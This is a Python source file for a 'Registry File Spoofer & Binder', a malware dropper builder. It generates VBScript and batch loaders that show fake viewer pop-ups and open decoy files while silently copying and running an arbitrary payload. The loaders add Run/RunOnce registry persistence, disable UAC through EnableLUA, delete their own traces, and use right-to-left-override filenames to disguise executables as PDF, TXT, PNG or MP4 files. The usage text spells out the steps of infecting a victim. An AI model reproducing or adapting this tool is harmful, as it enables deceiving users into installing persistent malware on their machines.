"""
Registry File Spoofer & Binder
Spoofs .reg files as .pdf, .txt, .png, .mp4
Features: Custom pop-ups, editable content, registry persistence
"""

import os
import sys
import struct
import base64
from pathlib import Path
from typing import Optional, Tuple

class RegSpoofer:
    """Registry file spoofer with format masquerading"""
    
    def __init__(self):
        self.output_dir = Path("output/spoofed")
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def create_persistence_reg(self, payload_path: str, popup_text: str = "System update required") -> str:
        """
        Create registry file for persistence
        Installs on next reboot
        """
        
        # Convert payload path for registry
        payload_path_escaped = payload_path.replace('\\', '\\\\')
        
        reg_content = f'''Windows Registry Editor Version 5.00

; System Persistence - Runs on startup
[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"SystemUpdate"="{payload_path_escaped}"

; Display pop-up notification
[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]
"EnableLUA"=dword:00000000

; Add startup task
[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce]
"SystemUpdate"="{payload_path_escaped}"

; Custom notification
[HKEY_CURRENT_USER\\Software\\UpdateNotification]
"Message"="{popup_text}"
"Enabled"=dword:00000001
'''
        
        return reg_content
    
    def create_payload_wrapper(self, payload_path: str, popup_title: str, popup_message: str, 
                               decoy_file: str = None) -> str:
        """
        Create VBScript wrapper with custom pop-up
        Shows decoy file and installs payload
        """
        
        decoy_open = ""
        if decoy_file:
            decoy_open = f'''
    ' Open decoy file
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "{decoy_file}", "", "", "open", 1
'''
        
        vbs_code = f'''Option Explicit

' Show custom pop-up
MsgBox "{popup_message}", vbInformation + vbSystemModal, "{popup_title}"

On Error Resume Next

Dim objShell, objFSO, tempPath, regFile, payloadPath

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get temp directory
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")

' Extract and execute payload
payloadPath = tempPath & "\\sysupdate.exe"

' Download/copy payload
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Copy payload to temp
objFSO.CopyFile "{payload_path}", payloadPath, True

' Create persistence registry
regFile = tempPath & "\\persist.reg"

Dim regContent
regContent = "Windows Registry Editor Version 5.00" & vbCrLf & vbCrLf
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]" & vbCrLf
regContent = regContent & """SystemUpdate""=""" & payloadPath & """" & vbCrLf

' Write registry file
Dim objFile
Set objFile = objFSO.CreateTextFile(regFile, True)
objFile.Write regContent
objFile.Close

' Import registry (silent)
objShell.Run "regedit.exe /s """ & regFile & """", 0, True

{decoy_open}

' Execute payload
objShell.Run """" & payloadPath & """", 0, False

' Show second notification
MsgBox "Installation complete. Changes will take effect on next reboot.", vbInformation, "{popup_title}"

' Clean up
On Error Resume Next
objFSO.DeleteFile regFile
objFSO.DeleteFile WScript.ScriptFullName

Set objFile = Nothing
Set objFSO = Nothing
Set objShell = Nothing
'''
        
        return vbs_code
    
    def create_pdf_spoof(self, payload_path: str, decoy_pdf_content: str,
                        popup_title: str = "Adobe Reader", 
                        popup_message: str = "Loading document...") -> str:
        """
        Create spoofed PDF file
        Actually a .reg file disguised as PDF
        """
        
        print("[*] Creating PDF spoof...")
        
        # Create VBS wrapper
        vbs_wrapper = self.create_payload_wrapper(
            payload_path, 
            popup_title, 
            popup_message,
            decoy_file=None
        )
        
        # Save VBS
        vbs_path = self.output_dir / "wrapper.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_wrapper)
        
        # Create PDF decoy with embedded VBS
        # Using RLO (Right-to-Left Override) Unicode trick
        rlo_char = '\u202E'  # RLO character
        
        # Filename: Document.pdf.exe → Document.exe[RLO]fdp.exe
        # This displays as: Document.exe.pdf visually
        
        output_name = f"Document{rlo_char}fdp.exe"
        
        # Create batch file that runs VBS
        batch_code = f'''@echo off
wscript.exe "{vbs_path}" 

REM Create fake PDF content
echo %TEMP%\\document.pdf > nul
type nul > "%TEMP%\\document.pdf"

REM Show PDF content
echo {decoy_pdf_content} > "%TEMP%\\document.txt"
notepad.exe "%TEMP%\\document.txt"

exit
'''
        
        batch_path = self.output_dir / output_name
        with open(batch_path, 'w') as f:
            f.write(batch_code)
        
        print(f"[+] PDF spoof created: {batch_path}")
        print(f"[*] Visual name: Document.exe.pdf")
        print(f"[*] Pop-up: {popup_title} - {popup_message}")
        
        return str(batch_path)
    
    def create_txt_spoof(self, payload_path: str, txt_content: str,
                        popup_title: str = "Notepad",
                        popup_message: str = "Opening file...") -> str:
        """Create spoofed TXT file"""
        
        print("[*] Creating TXT spoof...")
        
        # Create decoy text file
        decoy_txt = self.output_dir / "decoy.txt"
        with open(decoy_txt, 'w', encoding='utf-8') as f:
            f.write(txt_content)
        
        # Create VBS wrapper
        vbs_wrapper = self.create_payload_wrapper(
            payload_path,
            popup_title,
            popup_message,
            decoy_file=str(decoy_txt)
        )
        
        vbs_path = self.output_dir / "loader.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_wrapper)
        
        # Create executable with TXT icon
        exe_code = self.create_icon_exe(vbs_path, "txt")
        
        rlo_char = '\u202E'
        output_name = f"ReadMe{rlo_char}txt.exe"
        
        output_path = self.output_dir / output_name
        
        print(f"[+] TXT spoof created: {output_path}")
        return str(output_path)
    
    def create_png_spoof(self, payload_path: str, png_image_path: str,
                        popup_title: str = "Windows Photo Viewer",
                        popup_message: str = "Loading image...") -> str:
        """Create spoofed PNG image file"""
        
        print("[*] Creating PNG spoof...")
        
        # Create VBS that opens image and installs payload
        vbs_code = f'''Option Explicit

MsgBox "{popup_message}", vbInformation, "{popup_title}"

On Error Resume Next

Dim objShell, objFSO, tempPath, payloadPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Copy payload
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
payloadPath = tempPath & "\\winupd.exe"
objFSO.CopyFile "{payload_path}", payloadPath, True

' Registry persistence
Dim regFile
regFile = tempPath & "\\persist.reg"

Dim regContent
regContent = "Windows Registry Editor Version 5.00" & vbCrLf & vbCrLf
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]" & vbCrLf
regContent = regContent & """WinUpdate""=""" & payloadPath & """" & vbCrLf

Dim objFile
Set objFile = objFSO.CreateTextFile(regFile, True)
objFile.Write regContent
objFile.Close

' Import registry
objShell.Run "regedit.exe /s """ & regFile & """", 0, True

' Open actual image
objShell.Run "mspaint.exe ""{png_image_path}""", 1, False

' Execute payload
objShell.Run """" & payloadPath & """", 0, False

MsgBox "Image loaded successfully. System will be optimized on next restart.", vbInformation, "{popup_title}"

' Cleanup
objFSO.DeleteFile regFile
objFSO.DeleteFile WScript.ScriptFullName
'''
        
        vbs_path = self.output_dir / "image_loader.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_code)
        
        # RLO spoof
        rlo_char = '\u202E'
        output_name = f"Photo{rlo_char}gnp.exe"
        
        # Create BAT that calls VBS
        bat_code = f'@echo off\nwscript.exe "{vbs_path}"\nexit'
        
        output_path = self.output_dir / output_name
        with open(output_path, 'w') as f:
            f.write(bat_code)
        
        print(f"[+] PNG spoof created: {output_path}")
        print(f"[*] Visual name: Photo.exe.png")
        
        return str(output_path)
    
    def create_mp4_spoof(self, payload_path: str, video_url: str = None,
                        popup_title: str = "Windows Media Player",
                        popup_message: str = "Loading video...") -> str:
        """Create spoofed MP4 video file"""
        
        print("[*] Creating MP4 spoof...")
        
        video_open = ""
        if video_url:
            video_open = f'objShell.Run "explorer.exe ""{video_url}""", 1, False'
        
        vbs_code = f'''Option Explicit

MsgBox "{popup_message}", vbInformation, "{popup_title}"

On Error Resume Next

Dim objShell, objFSO, tempPath, payloadPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Install payload
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
payloadPath = tempPath & "\\mediasvc.exe"

objFSO.CopyFile "{payload_path}", payloadPath, True

' Registry persistence
Dim regFile
regFile = tempPath & "\\media.reg"

Dim regContent
regContent = "Windows Registry Editor Version 5.00" & vbCrLf & vbCrLf
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]" & vbCrLf
regContent = regContent & """MediaService""=""" & payloadPath & """" & vbCrLf

Dim objFile
Set objFile = objFSO.CreateTextFile(regFile, True)
objFile.Write regContent
objFile.Close

objShell.Run "regedit.exe /s """ & regFile & """", 0, True

{video_open}

' Execute payload
objShell.Run """" & payloadPath & """", 0, False

MsgBox "Video codec installed. Restart required for playback.", vbInformation, "{popup_title}"

objFSO.DeleteFile regFile
objFSO.DeleteFile WScript.ScriptFullName
'''
        
        vbs_path = self.output_dir / "video_loader.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_code)
        
        # RLO spoof
        rlo_char = '\u202E'
        output_name = f"Movie{rlo_char}4pm.exe"
        
        bat_code = f'@echo off\nwscript.exe "{vbs_path}"\nexit'
        
        output_path = self.output_dir / output_name
        with open(output_path, 'w') as f:
            f.write(bat_code)
        
        print(f"[+] MP4 spoof created: {output_path}")
        print(f"[*] Visual name: Movie.exe.mp4")
        
        return str(output_path)
    
    def create_icon_exe(self, script_path: str, icon_type: str) -> str:
        """Create executable with custom icon"""
        
        # Icon resource IDs for different file types
        icon_map = {
            "pdf": "C:\\Windows\\System32\\imageres.dll,105",
            "txt": "C:\\Windows\\System32\\imageres.dll,102", 
            "png": "C:\\Windows\\System32\\imageres.dll,72",
            "mp4": "C:\\Windows\\System32\\imageres.dll,189"
        }
        
        icon_path = icon_map.get(icon_type, icon_map["pdf"])
        
        return f"Icon: {icon_path}"
    
    def create_advanced_reg_spoof(self, payload_path: str, file_type: str, 
                                 custom_content: str, popup_config: dict) -> str:
        """
        Advanced registry spoof with custom configuration
        
        popup_config = {
            'title': str,
            'message': str,
            'warning_message': str  # Shown at end
        }
        """
        
        print("=" * 60)
        print(f"Creating Advanced {file_type.upper()} Spoof")
        print("=" * 60)
        
        popup_title = popup_config.get('title', f'{file_type.upper()} Viewer')
        popup_message = popup_config.get('message', 'Loading file...')
        warning_message = popup_config.get('warning_message', 'System will restart to apply changes')
        
        # Create comprehensive VBS with all features
        vbs_code = f'''Option Explicit

' ================================================
' Advanced Registry Spoof - {file_type.upper()}
' ================================================

On Error Resume Next

Dim objShell, objFSO, objNet, tempPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNet = CreateObject("WScript.Network")

' ========== INITIAL POP-UP ==========
MsgBox "{popup_message}", vbInformation + vbSystemModal, "{popup_title}"

' ========== ENVIRONMENT SETUP ==========
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
Dim payloadPath, regPath, decoyPath

payloadPath = tempPath & "\\syshost.exe"
regPath = tempPath & "\\config.reg"
decoyPath = tempPath & "\\document.{file_type}"

' ========== CREATE DECOY FILE ==========
Dim decoyContent
decoyContent = "{custom_content}"

Dim decoyFile
Set decoyFile = objFSO.CreateTextFile(decoyPath, True)
decoyFile.Write decoyContent
decoyFile.Close

' ========== COPY PAYLOAD ==========
objFSO.CopyFile "{payload_path}", payloadPath, True

' ========== CREATE REGISTRY PERSISTENCE ==========
Dim regContent
regContent = "Windows Registry Editor Version 5.00" & vbCrLf & vbCrLf

' RunOnce - Execute on next boot
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]" & vbCrLf
regContent = regContent & """SystemHost""=""" & payloadPath & """" & vbCrLf & vbCrLf

' Run - Execute on every boot
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]" & vbCrLf
regContent = regContent & """SecurityUpdate""=""" & payloadPath & """" & vbCrLf & vbCrLf

' Startup folder persistence
regContent = regContent & "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run]" & vbCrLf
regContent = regContent & """SecurityUpdate""=hex:02,00,00,00,00,00,00,00,00,00,00,00" & vbCrLf & vbCrLf

' ========== WRITE REGISTRY FILE ==========
Dim regFile
Set regFile = objFSO.CreateTextFile(regPath, True)
regFile.Write regContent
regFile.Close

' ========== IMPORT REGISTRY (SILENT) ==========
objShell.Run "regedit.exe /s """ & regPath & """", 0, True

WScript.Sleep 500

' ========== OPEN DECOY FILE ==========
Select Case "{file_type}"
    Case "pdf"
        objShell.Run "notepad.exe """ & decoyPath & """", 1, False
    Case "txt"
        objShell.Run "notepad.exe """ & decoyPath & """", 1, False
    Case "png"
        objShell.Run "mspaint.exe """ & decoyPath & """", 1, False
    Case "mp4"
        objShell.Run "explorer.exe """ & decoyPath & """", 1, False
End Select

WScript.Sleep 1000

' ========== EXECUTE PAYLOAD (HIDDEN) ==========
objShell.Run """" & payloadPath & """", 0, False

WScript.Sleep 500

' ========== FINAL WARNING POP-UP ==========
MsgBox "{warning_message}", vbExclamation + vbSystemModal, "{popup_title} - Notice"

' ========== CLEANUP ==========
WScript.Sleep 2000
objFSO.DeleteFile regPath
objFSO.DeleteFile WScript.ScriptFullName

Set decoyFile = Nothing
Set regFile = Nothing
Set objNet = Nothing
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit
'''
        
        # Save VBS
        vbs_path = self.output_dir / f"{file_type}_advanced.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_code)
        
        # Create spoofed filename with RLO
        rlo_char = '\u202E'
        
        file_ext_map = {
            'pdf': 'fdp',
            'txt': 'txt',
            'png': 'gnp',
            'mp4': '4pm'
        }
        
        ext_reversed = file_ext_map.get(file_type, 'fdp')
        output_name = f"Document{rlo_char}{ext_reversed}.exe"
        
        # Create batch launcher
        bat_code = f'''@echo off
>nul 2>&1 wscript.exe "{vbs_path}"
exit
'''
        
        output_path = self.output_dir / output_name
        with open(output_path, 'w') as f:
            f.write(bat_code)
        
        print(f"[+] Created: {output_path}")
        print(f"[*] Visual filename: Document.exe.{file_type}")
        print(f"[*] Initial pop-up: {popup_title} - {popup_message}")
        print(f"[*] Warning pop-up: {warning_message}")
        print(f"[*] Persistence: Registry RunOnce + Run")
        print(f"[*] Trigger: Next system reboot")
        
        return str(output_path)


def main():
    """Main registry spoofer"""
    
    print("=" * 60)
    print("Registry File Spoofer & Binder")
    print("Formats: .pdf, .txt, .png, .mp4")
    print("Features: Custom pop-ups, Registry persistence, Reboot trigger")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 3:
        print("Usage: python reg_spoofer.py <payload.exe> <format> [options]")
        print()
        print("Formats: pdf, txt, png, mp4")
        print()
        print("Options:")
        print("  --title <text>          Pop-up title")
        print("  --message <text>        Initial pop-up message")
        print("  --warning <text>        Final warning message")
        print("  --content <text>        Decoy file content")
        print()
        print("Examples:")
        print('  python reg_spoofer.py payload.exe pdf --title "Adobe Reader"')
        print('  python reg_spoofer.py payload.exe txt --content "Important document"')
        print('  python reg_spoofer.py payload.exe png --warning "Restart required"')
        print()
        return
    
    payload_path = sys.argv[1]
    file_format = sys.argv[2].lower()
    
    if not os.path.exists(payload_path):
        print(f"[!] Payload not found: {payload_path}")
        return
    
    if file_format not in ['pdf', 'txt', 'png', 'mp4']:
        print(f"[!] Unsupported format: {file_format}")
        return
    
    # Parse options
    popup_config = {
        'title': f'{file_format.upper()} Viewer',
        'message': 'Opening file. Please wait...',
        'warning_message': 'Installation complete. Changes will take effect after system restart.'
    }
    
    custom_content = "This is a secure document.\nFor security reasons, this file is encrypted.\nPlease restart your system to view full content."
    
    # Parse command line arguments
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == '--title' and i + 1 < len(sys.argv):
            popup_config['title'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--message' and i + 1 < len(sys.argv):
            popup_config['message'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--warning' and i + 1 < len(sys.argv):
            popup_config['warning_message'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--content' and i + 1 < len(sys.argv):
            custom_content = sys.argv[i + 1]
            i += 2
        else:
            i += 1
    
    # Create spoofer
    spoofer = RegSpoofer()
    
    # Generate spoofed file
    output_file = spoofer.create_advanced_reg_spoof(
        payload_path,
        file_format,
        custom_content,
        popup_config
    )
    
    print()
    print("[+] Registry spoof complete!")
    print()
    print("How it works:")
    print("  1. User opens spoofed file (appears as PDF/TXT/PNG/MP4)")
    print("  2. Custom pop-up message displays")
    print("  3. Decoy file opens (editable content)")
    print("  4. Registry persistence installed (silent)")
    print("  5. Payload executes (hidden)")
    print("  6. Warning pop-up at end")
    print("  7. Payload auto-runs on next reboot")
    print()
    print("Registry Persistence:")
    print("  - HKCU\\...\\RunOnce (one-time execution)")
    print("  - HKCU\\...\\Run (persistent)")
    print("  - Survives reboot")
    print()
    print(f"Output: {output_file}")


if __name__ == "__main__":
    main()
